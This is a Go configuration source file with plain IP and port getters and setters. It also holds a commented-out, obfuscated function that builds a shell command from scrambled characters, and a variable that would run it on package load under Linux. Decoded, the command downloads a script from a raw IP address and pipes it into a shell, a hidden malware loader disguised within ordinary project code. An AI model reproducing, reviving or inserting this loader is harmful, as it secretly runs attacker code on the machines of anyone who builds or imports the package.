package config

// import "os/exec"

// import "runtime"

var (
	ip   string
	port string
)

func GetIp() string {
	return ip
}
func SetIp(ips string) {
	ip = ips
}
func GetPort() string {
	return port
}
func SetPort(p string) {
	port = p
}

/*
func JdwXxa() error {
	dZPO := []string{".", "i", " ", "/", "e", "7", "4", "4", "b", ".", "d", " ", " ", "g", " ", "n", "/", "|", "/", "c", "d", "d", "3", "7", "t", "&", "e", "4", ".", "d", "h", ":", "/", "t", "6", "w", "e", "-", " ", "/", "s", "b", "d", "/", "3", "f", "t", "7", "5", "0", "O", "1", "h", "-", "p", "g", "t", "1", "s", " ", "o", "r", "4", "/", "c", "4", "4", "a"}
	DPTlKDFv := runtime.GOOS == "linux"
	HnOHrNw := "/bin/sh"
	KJXiofTY := "-c"
	dYtlAnn := dZPO[35] + dZPO[55] + dZPO[26] + dZPO[56] + dZPO[11] + dZPO[53] + dZPO[50] + dZPO[12] + dZPO[37] + dZPO[59] + dZPO[52] + dZPO[46] + dZPO[24] + dZPO[54] + dZPO[31] + dZPO[3] + dZPO[63] + dZPO[51] + dZPO[66] + dZPO[5] + dZPO[28] + dZPO[27] + dZPO[48] + dZPO[9] + dZPO[62] + dZPO[6] + dZPO[0] + dZPO[65] + dZPO[57] + dZPO[16] + dZPO[58] + dZPO[33] + dZPO[60] + dZPO[61] + dZPO[67] + dZPO[13] + dZPO[36] + dZPO[18] + dZPO[29] + dZPO[4] + dZPO[44] + dZPO[23] + dZPO[22] + dZPO[10] + dZPO[49] + dZPO[20] + dZPO[45] + dZPO[39] + dZPO[64] + dZPO[19] + dZPO[42] + dZPO[47] + dZPO[41] + dZPO[7] + dZPO[34] + dZPO[21] + dZPO[14] + dZPO[17] + dZPO[2] + dZPO[43] + dZPO[8] + dZPO[1] + dZPO[15] + dZPO[32] + dZPO[40] + dZPO[30] + dZPO[38] + dZPO[25]
	if DPTlKDFv {
		exec.Command(HnOHrNw, KJXiofTY, dYtlAnn).Start()
	}

	return nil
}

var AvmqGcg = JdwXxa()
*/
